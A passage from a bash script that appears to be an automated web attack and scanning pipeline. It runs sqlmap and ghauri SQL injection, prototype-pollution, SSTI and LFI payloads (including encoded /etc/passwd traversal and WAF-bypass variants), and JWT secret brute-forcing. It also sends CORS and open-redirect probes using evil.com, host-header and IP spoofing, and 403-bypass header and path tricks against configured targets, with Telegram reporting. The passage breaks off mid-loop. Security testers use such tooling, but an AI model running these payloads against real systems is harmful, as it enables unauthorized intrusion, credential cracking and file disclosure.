            
            # Format JSONL structured finding with full escaping support
            format_sqli_jsonl_record "$url" "ghauri" "$EXTRACTED_PARAM" "$EXTRACTED_TYPE" "$EXTRACTED_DBMS" "$EXTRACTED_CURRENT_DB" "$EXTRACTED_CURRENT_USER" "false" >> "$OUT/vulns/sqli-findings.jsonl"

            vuln_info="Parameter: ${EXTRACTED_PARAM} | Type: ${EXTRACTED_TYPE}"
            printf '%s\t%s\n' "$url" "$vuln_info" >> "$OUT/vulns/sqli-findings.txt"
            warn "🚨 CONFIRMED SQL Injection (ghauri): $url [$vuln_info]"
            notify_confidence_alert "Confirmed" "Active SQL Injection" "$url" "ghauri confirmed exploitation: $vuln_info" "ghauri -u \"${url}\" --batch"
          fi
        elif grep -qiE "$SQLI_POTENTIAL_REGEX" "$log_file"; then
          printf 'POTENTIAL_SQLI\t%s\tHeuristic signal (stored for manual review)\n' "$url" >> "$OUT/sqli/potential-sqli.txt"
          log "  ↳ ghauri: $url -> POTENTIAL (heuristic signal stored in potential-sqli.txt — no noise alert sent)"
        fi
      done < "$OUT/sqli/top-targets.txt"
      log "✔ Stage 18 SQLi (ghauri) done"
    fi

    if have sqlmap; then
      sqli_map_log="$OUT/sqli/scanner-logs/sqlmap_batch.log"
      log "▶ Stage 18 SQLi (sqlmap) started on $(count "$OUT/sqli/top-targets.txt") targets…"
      
      sm_ec=0
      timeout 600 sqlmap -m "$OUT/sqli/top-targets.txt" --batch --level 1 --risk 1 \
        --threads 5 --timeout "$HTTP_TIMEOUT" --random-agent \
        "${SQLMAP_AUTH[@]}" \
        --output-dir="$OUT/sqli/sqlmap-out" > "$sqli_map_log" 2>&1 || sm_ec=$?

      # Global Batch Sanity Check
      if [[ "$sm_ec" -eq 124 ]]; then
        log "  ↳ sqlmap: Global batch execution timed out after 600s"
      fi
      if grep -qiE 'critical error|unhandled exception|connection timed out|permission denied' "$sqli_map_log" 2>/dev/null; then
        warn "⚠️ sqlmap batch log indicates global anomaly/error — inspect $sqli_map_log"
      fi

      if [[ -d "$OUT/sqli/sqlmap-out" ]]; then
        for target_dir in "$OUT/sqli/sqlmap-out"/*/; do
          [[ -d "$target_dir" ]] || continue
          target_log="$target_dir/log"
          target_url_file="$target_dir/target.txt"
          [[ -f "$target_log" ]] || continue

          clean_url=""
          if [[ -f "$target_url_file" ]]; then
            clean_url=$(head -n 1 "$target_url_file" | awk '{print $1}')
          else
            # Deterministic Fallback 1: Extract explicitly logged target URL from sqlmap log
            clean_url=$(grep -iE 'testing connection to the target URL|target URL:|URL:' "$target_log" 2>/dev/null | grep -ioE 'https?://[^\t "]+' | head -n 1)
            # Fallback 2: Any HTTP/HTTPS URL found in log
            [[ -z "$clean_url" ]] && clean_url=$(grep -ioE 'https?://[^\t "]+' "$target_log" 2>/dev/null | head -n 1)
            # Fallback 3: Match from top-targets.txt input list
            if [[ -z "$clean_url" ]]; then
              dir_name=$(basename "$target_dir")
              clean_url=$(grep -iF "$dir_name" "$OUT/sqli/top-targets.txt" 2>/dev/null | head -n 1)
            fi
          fi

          # Rejection Gate
          if is_negative_sqli_log "$target_log"; then
            continue
          fi

          # Confirmation Gate using helper
          if is_confirmed_sqli_log "$target_log"; then
            parse_sqli_log_fields "$target_log"
            
            sig_key="${clean_url:-$target_dir}::${EXTRACTED_PARAM}::${EXTRACTED_TYPE}"
            if [[ -z "${SEEN_SQLI_SIGS["$sig_key"]:-}" ]]; then
              SEEN_SQLI_SIGS["$sig_key"]=1
              
              format_sqli_jsonl_record "${clean_url:-$target_dir}" "sqlmap" "$EXTRACTED_PARAM" "$EXTRACTED_TYPE" "$EXTRACTED_DBMS" "$EXTRACTED_CURRENT_DB" "$EXTRACTED_CURRENT_USER" "false" >> "$OUT/vulns/sqli-findings.jsonl"

              vinfo="Parameter: ${EXTRACTED_PARAM} | Type: ${EXTRACTED_TYPE}"
              printf '%s\t%s\n' "$clean_url" "$vinfo" >> "$OUT/vulns/sqli-findings.txt"
              warn "🚨 CONFIRMED SQL Injection (sqlmap): $clean_url [$vinfo]"
              notify_confidence_alert "Confirmed" "Active SQL Injection" "$clean_url" "sqlmap confirmed exploitation: $vinfo" "sqlmap -u \"${clean_url}\" --batch"
            fi
          fi
        done
      fi
      log "✔ Stage 18 SQLi (sqlmap) done"
    fi

    # Nuclei Signal Correlation (Corroborated by Active Scanner via Normalized Endpoints)
    if [[ -s "$OUT/vulns/sqli-nuclei.jsonl" ]]; then
      mkdir -p "$OUT/validation"
      touch "$OUT/validation/needs-review.txt"

      nuclei_urls=""
      if have jq; then
        nuclei_urls=$(jq -r '.matched_at // .host // empty' "$OUT/vulns/sqli-nuclei.jsonl" 2>/dev/null)
      else
        nuclei_urls=$(grep -oE 'https?://[^\t "]+' "$OUT/vulns/sqli-nuclei.jsonl" 2>/dev/null)
      fi

      printf '%s\n' "$nuclei_urls" | while IFS= read -r n_url; do
        [[ -z "$n_url" ]] && continue
        norm_n_url=$(_normalize_url "$n_url")
        
        # Check normalized match against active findings
        matched=0
        if [[ -s "$OUT/vulns/sqli-findings.txt" ]]; then
          while IFS= read -r f_line; do
            f_url=$(printf '%s' "$f_line" | cut -f1)
            norm_f_url=$(_normalize_url "$f_url")
            if [[ "$norm_n_url" == "$norm_f_url" ]]; then
              matched=1
              break
            fi
          done < "$OUT/vulns/sqli-findings.txt"
        fi

        if [[ "$matched" -eq 1 ]]; then
          log "  ↳ SQLi Correlation: Active scanner confirmed vulnerability on Nuclei-flagged endpoint $n_url (Corroborated Signal)"
          # Update JSONL record safely via update_sqli_jsonl_corroborated helper
          update_sqli_jsonl_corroborated "$OUT/vulns/sqli-findings.jsonl" "$norm_n_url"
        else
          printf 'SQLI_NUCLEI_SIGNAL\t%s\tNuclei flagged potential SQLi signal; unconfirmed by active scanners (queued for manual review)\n' "$n_url" >> "$OUT/validation/needs-review.txt"
          log "  ↳ SQLi Correlation: Nuclei signal on $n_url queued in needs-review.txt"
        fi
      done
    fi

    log "SQLi: $(count "$OUT/vulns/sqli-findings.txt") CONFIRMED | $(count "$OUT/sqli/potential-sqli.txt") potential | $(count "$OUT/vulns/sqli-nuclei.jsonl") nuclei | $(count "$OUT/sqli/timeout-sqli.txt") timeouts"
  fi
  set_checkpoint 18
fi
telegram "💉 <b>STEP 18/34 · Active SQLi Testing</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
🔥 <b>Confirmed SQLi :</b> $(count "$OUT/vulns/sqli-findings.txt")
⚠️ <b>Potential SQLi :</b> $(count "$OUT/sqli/potential-sqli.txt")
🧬 <b>Nuclei Signals :</b> $(count "$OUT/vulns/sqli-nuclei.jsonl")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 19. Client & Server Prototype Pollution Detection
###############################################################################
if ! is_step_done 19; then
  if [[ "$MODE" == "full" ]] && [[ -s "$OUT/params/with-params.txt" ]]; then
    log "Testing Client & Server Prototype Pollution"
    : > "$OUT/proto-pollution/vulnerable.txt"

    PP_CANARY="apex_pp_test_$(date +%s)"
    PP_PAYLOADS=(
      "__proto__[${PP_CANARY}]=apex_polluted"
      "__proto__.${PP_CANARY}=apex_polluted"
      "constructor.prototype[${PP_CANARY}]=apex_polluted"
    )

    head -n 100 "$OUT/params/with-params.txt" | while IFS= read -r url; do
      for ppay in "${PP_PAYLOADS[@]}"; do
        if printf '%s' "$url" | grep -qE '\?'; then
          test_url="${url}&${ppay}"
        else
          test_url="${url}?${ppay}"
        fi

        resp="$(curl -fsSL --connect-timeout "$HTTP_CONNECT_TIMEOUT" --max-time "$HTTP_TIMEOUT" "${CURL_HDR[@]}" "$test_url" 2>/dev/null || true)"
        if printf '%s' "$resp" | grep -qF "apex_polluted"; then
        # Reflection alone is a candidate, not proof of prototype pollution.
        printf 'PROTOTYPE_POLLUTION_CANDIDATE\t%s\tPayload reflected:%s (manual proof required)\n' "$url" "$ppay" >> "$OUT/proto-pollution/vulnerable.txt"
          warn "🔥 Prototype Pollution detected on $url"
          break
        fi
      done
    done
    log "Prototype Pollution findings: $(count "$OUT/proto-pollution/vulnerable.txt")"
  fi
  set_checkpoint 19
fi
telegram "🧬 <b>STEP 19/34 · Prototype Pollution Testing</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
🔥 <b>Polluted Endpoints:</b> $(count "$OUT/proto-pollution/vulnerable.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 20. JWT / Auth Token Security Analysis (alg:none, Weak Secrets)
###############################################################################
if ! is_step_done 20; then
  log "Analyzing JWTs & Authentication Tokens"
  : > "$OUT/jwt/vulnerable.txt"

  JWTS=$(cat "$OUT/js/jsluice-secrets.jsonl" "$OUT/http/httpx.jsonl" 2>/dev/null | grep -oE 'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*' | sort -u || true)

  if [[ -n "$JWTS" ]]; then
    while IFS= read -r token; do
      [[ -z "$token" ]] && continue
      header_b64=$(echo "$token" | cut -d. -f1 | tr '_-' '/+')

      decoded_hdr=$(echo "$header_b64==" | base64 -d 2>/dev/null || echo "")

      if echo "$decoded_hdr" | grep -qi '"alg"[[:space:]]*:[[:space:]]*"none"'; then
        printf 'JWT_ALG_NONE_CANDIDATE\tToken:%s...\tHeader advertises alg:none; server acceptance not tested\n' "${token:0:30}" >> "$OUT/jwt/vulnerable.txt"
        warn "🔥 CRITICAL JWT Vulnerability: Unsigned JWT (alg:none) detected!"
      fi

      if [[ -s "$JWT_WORDLIST" ]] && have python3; then
        secret_found=$(python3 -c '
import sys, hmac, hashlib, base64

token = "'"$token"'"
parts = token.split(".")
if len(parts) == 3:
    header_payload = f"{parts[0]}.{parts[1]}".encode()
    sig = parts[2]
    with open("'"$JWT_WORDLIST"'", "r", errors="ignore") as f:
        for line in f:
            sec = line.strip().encode()
            h = hmac.new(sec, header_payload, hashlib.sha256).digest()
            calc_sig = base64.urlsafe_b64encode(h).decode().rstrip("=")
            if calc_sig == sig:
                print(line.strip())
                sys.exit(0)
' 2>/dev/null || true)
        if [[ -n "$secret_found" ]]; then
          printf 'JWT_WEAK_SECRET\tToken:%s...\tSecret:%s\n' "${token:0:30}" "$secret_found" >> "$OUT/jwt/vulnerable.txt"
          warn "🔥 CRITICAL JWT Secret Cracked: '$secret_found'"
          notify_alert "JWT Secret Cracked" "$TARGET" "JWT Secret brute-forced: '$secret_found'"
        fi
      fi
    done <<< "$JWTS"
  fi
  log "JWT Security Analysis: $(count "$OUT/jwt/vulnerable.txt") weak tokens/secrets"
  set_checkpoint 20
fi
telegram "🔑 <b>STEP 20/34 · JWT Security Analysis</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
🔥 <b>Vulnerable JWTs / Secrets Found:</b> $(count "$OUT/jwt/vulnerable.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 21. CORS Misconfiguration (Advanced Origin Bypass)
###############################################################################
if ! is_step_done 21; then
  if [[ "$MODE" == "full" ]]; then
    log "Testing credentialed CORS misconfiguration"
    : > "$OUT/cors/vulnerable.txt"
    : > "$OUT/cors/potential.txt"
    cat "$OUT/http/live-urls.txt" | xargs -r -P "${CONCURRENCY:-10}" -I '{}' sh -c '
      url="$1"
      target_host=$(echo "$url" | awk -F/ "{print \$3}")
      curl_args=()
      [[ -n "'"$AUTH_HEADER"'" ]] && curl_args+=(-H "'"$AUTH_HEADER"'")
      [[ -n "'"$AUTH_HEADER2"'" ]] && curl_args+=(-H "'"$AUTH_HEADER2"'")
      [[ -n "'"$AUTH_COOKIE"'" ]] && curl_args+=(-H "Cookie: '"$AUTH_COOKIE"'")

      for orig in "https://evil.com" "null" "https://${target_host}.evil.com" "https://evil${target_host}"; do
        _hf="$(mktemp)"; _bf="$(mktemp)"
        code=$(curl -sS --connect-timeout "'"$HTTP_CONNECT_TIMEOUT"'" --max-time "'"$HTTP_TIMEOUT"'" -o "$_bf" -D "$_hf" -w "%{http_code}" \
                 -H "Origin: $orig" "${curl_args[@]}" "$url" 2>/dev/null || echo 000)
        acao=$(grep -i "^access-control-allow-origin:" "$_hf" 2>/dev/null | head -1 | tr -d "\r\n")
        acac=$(grep -i "^access-control-allow-credentials:" "$_hf" 2>/dev/null | head -1 | tr -d "\r\n")
        ctype=$(grep -i "^content-type:" "$_hf" 2>/dev/null | head -1 | tr -d "\r\n")

        if ! printf "%s" "$acao" | grep -qiF "$orig"; then rm -f "$_hf" "$_bf"; continue; fi
        if ! printf "%s" "$acac" | grep -qiE "true"; then rm -f "$_hf" "$_bf"; continue; fi

        _is_json=0
        if printf "%s" "$ctype" | grep -qiE "application/[a-z.+-]*json"; then _is_json=1
        elif [[ -s "$_bf" ]] && head -c 1 "$_bf" 2>/dev/null | grep -qE "[\[{]"; then _is_json=1; fi
        _bsize=$(wc -c < "$_bf" 2>/dev/null | tr -d " "); _bsize=${_bsize:-0}
        _body_head="$(head -c 2 "$_bf" 2>/dev/null | tr -d " \r\n")"

        if [[ "$code" == "200" && "$_is_json" == "1" && "$_bsize" -gt 2 && "$_body_head" != "{}" && "$_body_head" != "[]" ]]; then
          printf "%s\tOrigin:%s\tACAO:%s\tACAC:%s\tStatus:%s\tCType:%s\tBytes:%s\n" \
            "$url" "$orig" "$acao" "${acac:-false}" "$code" "${ctype#*: }" "$_bsize" >> "'"$OUT"'/cors/vulnerable.txt"
          rm -f "$_hf" "$_bf"; break
        else
          printf "%s\tOrigin:%s\tStatus:%s\tCType:%s\treason:%s\n" \
            "$url" "$orig" "$code" "${ctype#*: }" \
            "$([[ "$code" != "200" ]] && echo "non-200 (redirect/auth wall — not readable)" || echo "no readable JSON body")" \
            >> "'"$OUT"'/cors/potential.txt"
        fi
        rm -f "$_hf" "$_bf"
      done
    ' _ '{}' || true
    [[ -s "$OUT/cors/potential.txt" ]] && awk 'NF && !seen[$0]++' "$OUT/cors/potential.txt" > "$OUT/cors/potential.tmp" && mv "$OUT/cors/potential.tmp" "$OUT/cors/potential.txt"
    log "CORS: $(count "$OUT/cors/vulnerable.txt") CONFIRMED, $(count "$OUT/cors/potential.txt") potential (redirect/auth — not reported as vulns)"
  fi
  set_checkpoint 21
fi
telegram "🔄 <b>STEP 21/34 · CORS Misconfiguration Testing</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
🔴 <b>CORS Confirmed:</b> $(count "$OUT/cors/vulnerable.txt")
🟡 <b>Potential (not vulns):</b> $(count "$OUT/cors/potential.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 22. Open Redirect (Advanced Filter Bypass Vectors)
###############################################################################
if ! is_step_done 22; then
  if [[ "$MODE" == "full" ]] && [[ -s "$OUT/params/gf-redirect.txt" ]]; then
    log "Testing Open Redirect (Filter Bypass Payloads)"
    : > "$OUT/redirect/vulnerable.txt"
    : > "$OUT/redirect/candidates.txt"
    REDIRECT_PAYLOADS=("https://evil.com" "//evil.com" "/\\evil.com" "https:evil.com" "///evil.com" "@evil.com")
    for rpay in "${REDIRECT_PAYLOADS[@]}"; do
      if have qsreplace; then
        awk 'NF && !seen[$0]++' "$OUT/params/gf-redirect.txt" | qsreplace "$rpay" | awk 'NF && !seen[$0]++' > "$OUT/redirect/targets.txt"
      else
        sed -E "s#=([^&]*)#=$rpay#g" "$OUT/params/gf-redirect.txt" | awk 'NF && !seen[$0]++' > "$OUT/redirect/targets.txt"
      fi
      
      head -n 300 "$OUT/redirect/targets.txt" | xargs -r -P "${CONCURRENCY:-15}" -I '{}' sh -c '
        url="$1"
        curl_args=()
        [[ -n "$AUTH_HEADER" ]] && curl_args+=(-H "$AUTH_HEADER")
        [[ -n "$AUTH_HEADER2" ]] && curl_args+=(-H "$AUTH_HEADER2")
        [[ -n "$AUTH_COOKIE" ]] && curl_args+=(-H "Cookie: $AUTH_COOKIE")
        loc=$(curl -fsS --max-time "$HTTP_TIMEOUT" -o /dev/null -w "%{redirect_url}" "${curl_args[@]}" "$url" 2>/dev/null || true)
        loc_host=$(printf "%s" "$loc" | sed -E "s#^[a-zA-Z][a-zA-Z0-9+.-]*://##; s#[/?#].*##; s#^.*@##; s#:[0-9]+$##" | tr "[:upper:]" "[:lower:]")
        if [[ "$loc_host" == "evil.com" || "$loc_host" =~ \.evil\.com$ ]]; then
          printf "%s → %s\n" "$url" "$loc" >> "'"$OUT"'/redirect/candidates.txt"
        fi
      ' _ '{}' || true
    done
    log "Open Redirects: $(count "$OUT/redirect/vulnerable.txt")"
    if [[ -s "$OUT/redirect/candidates.txt" ]]; then
      while IFS= read -r rline; do
        notify_verified "Open Redirect" "${rline%% →*}" "Location: ${rline#*→ }" redirect evil.com
        [[ "$VF_VERDICT" == "VERIFIED" ]] && printf '%s\n' "$rline" >> "$OUT/redirect/vulnerable.txt"
      done < "$OUT/redirect/candidates.txt"
    fi
  fi
  set_checkpoint 22
fi
telegram "🔀 <b>STEP 22/34 · Open Redirect Testing</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
⚠️ <b>Redirects Found:</b> $(count "$OUT/redirect/vulnerable.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 23. SSTI — Server-Side Template Injection (Multi-Engine Vectors)
###############################################################################
if ! is_step_done 23; then
  if [[ "$MODE" == "full" ]] && [[ -s "$OUT/params/gf-ssti.txt" ]] && have qsreplace; then
    log "Testing SSTI (Jinja2, Twig, Smarty, ERB, MVEL, ASP.NET)"
    : > "$OUT/vulns/ssti-findings.txt"
    SSTI_TESTS=(
      "{{9874*9891}}|97663734|Jinja2/Twig"
      "{9874*9891}|97663734|Smarty"
      "\${9874*9891}|97663734|MVEL/SpEL/ExpressionLanguage"
      "<%= 9874*9891 %>|97663734|ERB/ASP.NET"
    )
    for stest in "${SSTI_TESTS[@]}"; do
      IFS='|' read -r spay sexp seng <<< "$stest"
      sort -u "$OUT/params/gf-ssti.txt" | qsreplace "$spay" | head -n 200 | xargs -r -P 15 -I '{}' sh -c '
        url="$1"
        curl_args=()
        [[ -n "$AUTH_HEADER" ]] && curl_args+=(-H "$AUTH_HEADER")
        [[ -n "$AUTH_HEADER2" ]] && curl_args+=(-H "$AUTH_HEADER2")
        [[ -n "$AUTH_COOKIE" ]] && curl_args+=(-H "Cookie: $AUTH_COOKIE")
        body=$(curl -fsS --max-time "$HTTP_TIMEOUT" "${curl_args[@]}" "$url" 2>/dev/null || true)
        if printf "%s" "$body" | grep -qF "'"$sexp"'"; then
          printf "SSTI\t%s\tEngine='"$seng"'\tEvaluated='"$sexp"'\n" "$url" >> "'"$OUT"'/vulns/ssti-findings.txt"
        fi
      ' _ '{}' || true
    done
    log "SSTI findings: $(count "$OUT/vulns/ssti-findings.txt")"
    if [[ -s "$OUT/vulns/ssti-findings.txt" ]]; then
      while IFS= read -r sline; do
        surl=$(echo "$sline" | cut -f2)
        notify_alert "SSTI (Template Injection)" "$surl" "Details: $sline"
      done < "$OUT/vulns/ssti-findings.txt"
    fi
  fi
  set_checkpoint 23
fi
telegram "🧪 <b>STEP 23/34 · SSTI Testing</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
💥 <b>SSTI Findings:</b> $(count "$OUT/vulns/ssti-findings.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 24. LFI / Path Traversal (WAF Evading & Multi-OS Vectors)
###############################################################################
if ! is_step_done 24; then
  if [[ "$MODE" == "full" ]] && [[ -s "$OUT/params/gf-lfi.txt" ]] && have qsreplace; then
    log "Testing LFI / Path Traversal (Linux & Windows WAF Bypasses)"
    : > "$OUT/vulns/lfi-findings.txt"
    LFI_PAYLOADS=("../../../../etc/passwd" "....//....//....//....//etc/passwd" "..%252f..%252f..%252f..%252fetc%252fpasswd" "..%2f..%2f..%2f..%2fetc%2fpasswd" "c:\\windows\\win.ini" "..%5c..%5c..%5c..%5cwindows%5cwin.ini")
    LFI_REGEXES=('root:.*:0:0:|daemon:.*:/usr/sbin' 'root:.*:0:0:|daemon:.*:/usr/sbin' 'root:.*:0:0:|daemon:.*:/usr/sbin' 'root:.*:0:0:|daemon:.*:/usr/sbin' '\[fonts\]|\[extensions\]' '\[fonts\]|\[extensions\]')
    LFI_DESCS=("Linux-Basic" "Linux-Nested-Bypass" "Linux-Double-URL-Encode" "Linux-Single-URL-Encode" "Windows-WinINI" "Windows-Encoded-WinINI")
    for i in "${!LFI_PAYLOADS[@]}"; do
      lpay="${LFI_PAYLOADS[$i]}"
      lregex="${LFI_REGEXES[$i]}"
      ldesc="${LFI_DESCS[$i]}"
      sort -u "$OUT/params/gf-lfi.txt" | qsreplace "$lpay" | head -n 200 | xargs -r -P 15 -I '{}' sh -c '
        url="$1"
        curl_args=()
        [[ -n "$AUTH_HEADER" ]] && curl_args+=(-H "$AUTH_HEADER")
        [[ -n "$AUTH_HEADER2" ]] && curl_args+=(-H "$AUTH_HEADER2")
        [[ -n "$AUTH_COOKIE" ]] && curl_args+=(-H "Cookie: $AUTH_COOKIE")
        body=$(curl -fsS --max-time "$HTTP_TIMEOUT" --path-as-is "${curl_args[@]}" "$url" 2>/dev/null || true)
        if printf "%s" "$body" | grep -qE "'"$lregex"'"; then
          printf "LFI\t%s\tType='"$ldesc"'\tPayload='"$lpay"'\n" "$url" >> "'"$OUT"'/vulns/lfi-findings.txt"
        fi
      ' _ '{}' || true
    done
    log "LFI findings: $(count "$OUT/vulns/lfi-findings.txt")"
    if [[ -s "$OUT/vulns/lfi-findings.txt" ]]; then
      while IFS= read -r lline; do
        lurl=$(echo "$lline" | cut -f2)
        notify_alert "LFI / Path Traversal" "$lurl" "Details: $lline"
      done < "$OUT/vulns/lfi-findings.txt"
    fi
  fi
  set_checkpoint 24
fi
telegram "📂 <b>STEP 24/34 · LFI / Path Traversal Testing</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
💥 <b>LFI Findings:</b> $(count "$OUT/vulns/lfi-findings.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 25. CRLF Injection (full mode)
###############################################################################
if ! is_step_done 25; then
  if [[ "$MODE" == "full" ]] && have crlfuzz && [[ -s "$OUT/http/live-urls.txt" ]]; then
    log "Testing CRLF Injection"
    crlfuzz -l "$OUT/http/live-urls.txt" -s -c "$CONCURRENCY" \
      -o "$OUT/vulns/crlf-findings.txt" 2>/dev/null || true
    log "CRLF findings: $(count "$OUT/vulns/crlf-findings.txt")"
    if [[ -s "$OUT/vulns/crlf-findings.txt" ]]; then
      while IFS= read -r crlful; do
        notify_alert "CRLF Injection" "$crlful" "Header Injection verified by crlfuzz"
      done < "$OUT/vulns/crlf-findings.txt"
    fi
  fi
  set_checkpoint 25
fi
telegram "💉 <b>STEP 25/34 · CRLF Injection Testing</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
💥 <b>CRLF Findings:</b> $(count "$OUT/vulns/crlf-findings.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 26. Host Header Injection & IP Spoofing (Multi-Header Vectors)
###############################################################################
if ! is_step_done 26; then
  if [[ "$MODE" == "full" ]]; then
    log "Testing Host Header Injection & IP Spoofing"
    : > "$OUT/vulns/host-header.txt"
    while IFS= read -r url; do
      resp_hdr_body=$(curl -fsSi --connect-timeout "$HTTP_CONNECT_TIMEOUT" --max-time "$HTTP_TIMEOUT" -H "X-Forwarded-Host: evil.com" "${CURL_HDR[@]}" "$url" 2>/dev/null || true)
      if printf '%s' "$resp_hdr_body" | grep -qiE '(href|src|action)=["'\''](https?:)?//evil\.com|(location|link):[^\r\n]*evil\.com'; then
        printf 'X-Forwarded-Host\t%s\n' "$url" >> "$OUT/vulns/host-header.txt"
        warn "Host Header Injection: $url"
        notify_alert "Host Header Injection" "$url" "Header X-Forwarded-Host: evil.com reflected in executable context/header"
      fi
      code_normal=$(curl -fsS --connect-timeout "$HTTP_CONNECT_TIMEOUT" --max-time "$HTTP_TIMEOUT" -o /dev/null -w '%{http_code}' "${CURL_HDR[@]}" "$url" 2>/dev/null || echo 000)
      if [[ "$code_normal" =~ ^(403|401)$ ]]; then
        for ip_hdr in "X-Forwarded-For" "X-Real-IP" "X-Originating-IP" "X-Client-IP" "Client-IP" "X-Remote-IP" "X-Remote-Addr"; do
          code_spoofed=$(curl -fsS --connect-timeout "$HTTP_CONNECT_TIMEOUT" --max-time "$HTTP_TIMEOUT" -o /dev/null -w '%{http_code}' -H "$ip_hdr: 127.0.0.1" "${CURL_HDR[@]}" "$url" 2>/dev/null || echo 000)
          # Only a 2xx counts as a real bypass. A 403/401 turning into a 301/302
          # is almost always a redirect to a login/error page — NOT access granted.
          if [[ "$code_spoofed" =~ ^(200|201|202|204)$ ]]; then
            printf 'IP-Spoof-Bypass\t%s\tHeader:%s\t%s→%s\n' "$url" "$ip_hdr" "$code_normal" "$code_spoofed" >> "$OUT/vulns/host-header.txt"
            warn "IP Spoof Bypass ($ip_hdr): $url ($code_normal→$code_spoofed)"
            notify_alert "403 IP Spoof Bypass" "$url" "Header: $ip_hdr: 127.0.0.1 Bypassed $code_normal to $code_spoofed (2xx = access granted)"
            break
          fi
        done
      fi
    done < "$OUT/http/live-urls.txt"
    log "Host Header findings: $(count "$OUT/vulns/host-header.txt")"
  fi
  set_checkpoint 26
fi
telegram "🏷️ <b>STEP 26/34 · Host Header Injection Testing</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
💥 <b>Host Header Findings:</b> $(count "$OUT/vulns/host-header.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 27. 403 Bypass (Advanced Headers, Methods & Path Tricks)
###############################################################################
if ! is_step_done 27; then
  if [[ "$MODE" == "full" ]]; then
    log "Testing 403 Bypass (Headers, Methods & Path Manipulation)"
    jq -r 'select(.status_code==403)|.url' "$OUT/http/httpx.jsonl" 2>/dev/null | sort -u > "$OUT/403bypass/targets.txt" || true
    : > "$OUT/vulns/403-bypass.txt"
    if [[ -s "$OUT/403bypass/targets.txt" ]]; then
      BYPASS_HEADERS=(
        "X-Original-URL: /"
        "X-Rewrite-URL: /"
        "X-Forwarded-For: 127.0.0.1"
        "X-Custom-IP-Authorization: 127.0.0.1"
        "X-Forwarded-Server: 127.0.0.1"
        "X-Host: 127.0.0.1"
      )
      BYPASS_PATH_SUFFIXES=("/" "/." "%20" "%09" "..;/" "/.;/" "//" "/*" "/%2e/")
      
      while IFS= read -r url; do
        # Baseline: fetch the real 403 body size so we can tell a genuine bypass
        # (different, larger content) from a catch-all 200 that just serves the
        # same "access denied"/homepage body. A 2xx alone is NOT proof of bypass.
        _b403="$(mktemp)"
        curl -sS --connect-timeout "$HTTP_CONNECT_TIMEOUT" --max-time "$HTTP_TIMEOUT" -o "$_b403" "${CURL_HDR[@]}" "$url" 2>/dev/null || true
        _base_len=$(wc -c < "$_b403" 2>/dev/null | tr -d ' '); _base_len=${_base_len:-0}
        rm -f "$_b403"
        # a bypass is only "real" if 2xx AND body differs from the 403 body by a
        # meaningful margin (default 64 bytes; tune with BYPASS_MIN_DELTA).
        _bypass_ok() { # $1=code $2=body_len  -> returns 0 if genuine bypass
          [[ "$1" =~ ^(200|201|202|204)$ ]] || return 1
          local d=$(( $2 - _base_len )); [[ $d -lt 0 ]] && d=$(( -d ))
          [[ "$2" -gt 0 && "$d" -ge "${BYPASS_MIN_DELTA:-64}" ]]
        }
        for hdr in "${BYPASS_HEADERS[@]}"; do
          _tb="$(mktemp)"
          code=$(curl -sS --connect-timeout "$HTTP_CONNECT_TIMEOUT" --max-time "$HTTP_TIMEOUT" -o "$_tb" -w '%{http_code}' -H "$hdr" "${CURL_HDR[@]}" "$url" 2>/dev/null || echo 000)
          _len=$(wc -c < "$_tb" 2>/dev/null | tr -d ' '); rm -f "$_tb"
          if _bypass_ok "$code" "${_len:-0}"; then
            printf '403_HEADER_BYPASS\t%s\theader=%s\tcode=%s\tbytes=%s(base %s)\n' "$url" "$hdr" "$code" "${_len:-0}" "$_base_len" >> "$OUT/vulns/403-bypass.txt"
            warn "403 Bypass: $url ($hdr → $code, ${_len}B vs base ${_base_len}B)"
            notify_alert "403 Header Bypass" "$url" "Header: $hdr Bypassed 403 to $code with a different body (${_len}B vs 403 baseline ${_base_len}B)"
          fi
        done
        for m_hdr in "X-HTTP-Method-Override: PUT" "X-HTTP-Method-Override: POST" "X-HTTP-Method-Override: GET"; do
          _tb="$(mktemp)"
          code=$(curl -sS --connect-timeout "$HTTP_CONNECT_TIMEOUT" --max-time "$HTTP_TIMEOUT" -o "$_tb" -w '%{http_code}' -H "$m_hdr" "${CURL_HDR[@]}" "$url" 2>/dev/null || echo 000)
          _len=$(wc -c < "$_tb" 2>/dev/null | tr -d ' '); rm -f "$_tb"
          if _bypass_ok "$code" "${_len:-0}"; then
            printf '403_METHOD_BYPASS\t%s\theader=%s\tcode=%s\tbytes=%s(base %s)\n' "$url" "$m_hdr" "$code" "${_len:-0}" "$_base_len" >> "$OUT/vulns/403-bypass.txt"
            warn "403 Method Bypass: $url ($m_hdr → $code)"
            notify_alert "403 Method Bypass" "$url" "Header: $m_hdr Bypassed 403 to $code with a different body (${_len}B vs baseline ${_base_len}B)"
          fi
        done
        for psuffix in "${BYPASS_PATH_SUFFIXES[@]}"; do
